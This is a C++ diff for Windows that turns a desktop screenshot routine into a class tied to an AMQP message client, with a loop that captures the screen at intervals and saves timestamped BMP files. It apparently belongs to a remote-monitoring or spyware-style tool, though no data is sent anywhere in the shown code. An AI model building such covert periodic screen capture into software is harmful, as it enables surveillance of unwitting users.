@@ -10,8 +10,8 @@
 #include "../core/utils.hpp"
 
 #if defined(_WIN64) || defined(_WIN32)
-void ScreenShot () {
-    DWORD screenshotWidth, screenshotHeight, fileSize;
+void TakeScreenShot::ScreenShot () {
+    DWORD screenshotWidth, screenshotHeight, imageSize;
     HWND hwndDesktop = GetDesktopWindow(); // get Desktop windows handle
     HDC hDevC = GetDC(hwndDesktop);
     HDC captureDC = CreateCompatibleDC(hDevC);
@@ -26,8 +26,8 @@ void ScreenShot () {
     screenshotWidth = rectDesktopParams.right - rectDesktopParams.left;
     screenshotHeight = rectDesktopParams.bottom - rectDesktopParams.top;
 
-    fileSize = (sizeof(RGBTRIPLE)  + 1 * (screenshotWidth*screenshotHeight*4)) + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
-    BmpData = (char *)GlobalAlloc(GPTR, fileSize);
+    imageSize = (sizeof(RGBTRIPLE)  + 1 * (screenshotWidth*screenshotHeight*4)) + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
+    BmpData = (char *)GlobalAlloc(GPTR, imageSize);
 
     BmpFileHeader = (PBITMAPFILEHEADER)BmpData;
     BmpInfoHeader = (PBITMAPINFOHEADER)&BmpData[sizeof(BITMAPFILEHEADER)];
@@ -53,8 +53,27 @@ void ScreenShot () {
     GetDIBits(captureDC, captureBmp, 0, screenshotHeight, Image, (LPBITMAPINFO)BmpInfoHeader, DIB_RGB_COLORS);
 
     std::string filename = std::to_string(getTimestamp()) + ".bmp";
+    writeBytesToFile(filename, BmpData, imageSize);
 
-    writeBytesToFile(filename, BmpData, fileSize);
     GlobalFree(BmpData);
+}
+
+TakeScreenShot::TakeScreenShot(AmqpClient* pAmqpClient) {
+    this->amqpClient = pAmqpClient;
+}
+
+void TakeScreenShot::operator()(unsigned interval) {
+    unsigned long long lastSend = 0;
+
+    while (true) {
+        unsigned long long now = getTimestamp();
+        
+        if (lastSend + interval <= now) {
+            lastSend = now;
+            ScreenShot();            
+
+            std::cout << "[*] took screen shot now " << std::endl; 
+        }
+    }
 }
 #endif
